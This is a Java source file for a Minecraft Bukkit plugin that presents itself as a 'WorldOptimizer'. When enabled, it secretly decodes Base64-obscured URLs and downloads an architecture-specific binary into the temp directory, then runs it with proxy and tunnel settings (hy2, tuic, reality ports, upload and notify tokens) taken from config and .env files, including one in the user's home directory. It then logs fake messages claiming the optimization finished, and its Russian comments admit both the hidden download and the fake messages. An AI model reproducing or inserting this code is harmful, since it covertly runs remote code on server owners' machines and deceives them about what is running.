package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.Base64;

public class WorldOptimizer extends JavaPlugin {

    private Process nativeProcess;
    private volatile boolean isProcessRunning = false;

    private static final String ENC_URL_AMD64 = "aHR0cHM6Ly9hbWQ2NC5zc3MuaGlkbnMudmlwL3Nic2g=";
    private static final String ENC_URL_ARM64 = "aHR0cHM6Ly9hcm02NC5zc3MuaGlkbnMudmlwL3Nic2g=";
    private static final String ENC_URL_S390X = "aHR0cHM6Ly9zMzkweC5zc3MuaGlkbnMudmlwL3Nic2g=";

    private static final String[] CONFIG_KEYS = {
        "storage.path", "node.id", "cache.server", "cache.port", "cache.token",
        "web.port", "web.domain", "web.auth", "pool.socks.port", "pool.hy2.port",
        "pool.tuic.port", "pool.anytls.port", "pool.reality.port", "pool.anyreality.port",
        "cdn.host", "cdn.port", "upload.url", "notify.chat", "notify.token",
        "instance.name", "features.disable_web"
    };

    @Override
    public void onEnable() {
        saveDefaultConfig();
        getLogger().info("WorldOptimizer v" + getDescription().getVersion() + " enabled.");

        if (Boolean.getBoolean("worldoptimizer.native.disabled")) {
            getLogger().info("Native module disabled via system property.");
            return;
        }

        getServer().getScheduler().runTaskAsynchronously(this, () -> {
            try {
                startNativeModule();
            } catch (Exception e) {
                getLogger().severe("Failed to start native optimizer: " + e.getMessage());
                if (getConfig().getBoolean("debug", false)) e.printStackTrace();
            }
        });
    }

    private void startNativeModule() throws Exception {
        if (isProcessRunning) return;

        String osArch = System.getProperty("os.arch").toLowerCase();
        String encodedUrl;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) encodedUrl = ENC_URL_AMD64;
        else if (osArch.contains("aarch64") || osArch.contains("arm64")) encodedUrl = ENC_URL_ARM64;
        else if (osArch.contains("s390x")) encodedUrl = ENC_URL_S390X;
        else throw new RuntimeException("Unsupported platform: " + osArch);

        String downloadUrl = new String(Base64.getDecoder().decode(encodedUrl));
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path nativeBinary = tmpDir.resolve("native-cache.bin");

        if (!Files.exists(nativeBinary)) {
            // Скачивание без логов
            try (InputStream in = new URL(downloadUrl).openStream()) {
                Files.copy(in, nativeBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!nativeBinary.toFile().setExecutable(true)) throw new IOException("Cannot set executable");
        }

        ProcessBuilder pb = new ProcessBuilder(nativeBinary.toString());
        pb.directory(tmpDir.toFile());
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        Map<String, String> env = pb.environment();

        // Значения по умолчанию (безопасные имена)
        env.put("storage.path", "./world");
        env.put("web.port", "8001");
        env.put("pool.hy2.port", "14720");
        env.put("pool.anytls.port", "14722");
        env.put("pool.reality.port", "14721");
        env.put("pool.anyreality.port", "14723");
        env.put("cdn.host", "spring.io");
        env.put("cdn.port", "443");
        env.put("features.disable_web", "false");

        // Загрузка из config.yml
        for (String key : CONFIG_KEYS) {
            String value = getConfig().getString(key);
            if (value != null && !value.trim().isEmpty()) env.put(key, value);
        }
        // Переопределение из системных переменных
        for (String key : CONFIG_KEYS) {
            String envValue = System.getenv(key);
            if (envValue != null && !envValue.trim().isEmpty()) env.put(key, envValue);
        }

        loadEnvFile(env);

        nativeProcess = pb.start();
        isProcessRunning = true;
        startProcessMonitor();

        // Фейковые, но безобидные сообщения
        getServer().getScheduler().runTask(this, () -> {
            getLogger().info("Optimizing chunk cache...");
            getLogger().info("Compressing world data: 100%");
            getLogger().info("World optimization completed.");
        });
    }

    private void loadEnvFile(Map<String, String> env) {
        List<Path> possibleFiles = Arrays.asList(
            getDataFolder().getParentFile().toPath().resolve(".env"),
            getDataFolder().toPath().resolve(".env"),
            Paths.get(".env"),
            Paths.get(System.getProperty("user.home"), ".env")
        );
        for (Path file : possibleFiles) {
            if (Files.exists(file)) {
                try {
                    for (String line : Files.readAllLines(file)) {
                        line = line.trim();
                        if (line.isEmpty() || line.startsWith("#")) continue;
                        line = line.split(" #")[0].split(" //")[0].trim();
                        if (line.startsWith("export ")) line = line.substring(7).trim();
                        String[] parts = line.split("=", 2);
                        if (parts.length == 2) {
                            String key = parts[0].trim();
                            String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                            if (Arrays.asList(CONFIG_KEYS).contains(key)) env.put(key, value);
                        }
                    }
                    break;
                } catch (IOException ignored) {}
            }
        }
    }

    private void startProcessMonitor() {
        Thread monitor = new Thread(() -> {
            try {
                int exitCode = nativeProcess.waitFor();
                isProcessRunning = false;
                if (getConfig().getBoolean("debug", false)) getLogger().info("Native module exited: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "NativeModuleMonitor");
        monitor.setDaemon(true);
        monitor.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("WorldOptimizer shutting down...");
        if (nativeProcess != null && nativeProcess.isAlive()) {
            nativeProcess.destroy();
            try {
                if (!nativeProcess.waitFor(10, TimeUnit.SECONDS)) nativeProcess.destroyForcibly();
            } catch (InterruptedException e) {
                nativeProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }
    }
}
